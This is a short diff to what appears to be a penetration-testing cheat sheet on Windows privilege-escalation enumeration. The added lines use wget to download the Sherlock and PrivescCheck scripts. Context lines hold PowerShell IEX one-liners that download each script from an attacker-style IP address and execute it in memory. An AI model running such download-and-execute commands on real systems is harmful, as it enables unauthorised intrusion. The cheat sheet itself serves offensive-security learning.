@@ -549,11 +549,15 @@ Get-NtTokenIntegrityLevel
 ### Sherlock
 https://github.com/rasta-mouse/Sherlock
 ```powershell
+wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
+
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/Sherlock.ps1'); Find-AllVulns
 ```
 ### PrivescCheck
 https://github.com/itm4n/PrivescCheck
 ```powershell
+wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
+
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/PrivescCheck.ps1'); Invoke-PrivescCheck
 ```
 
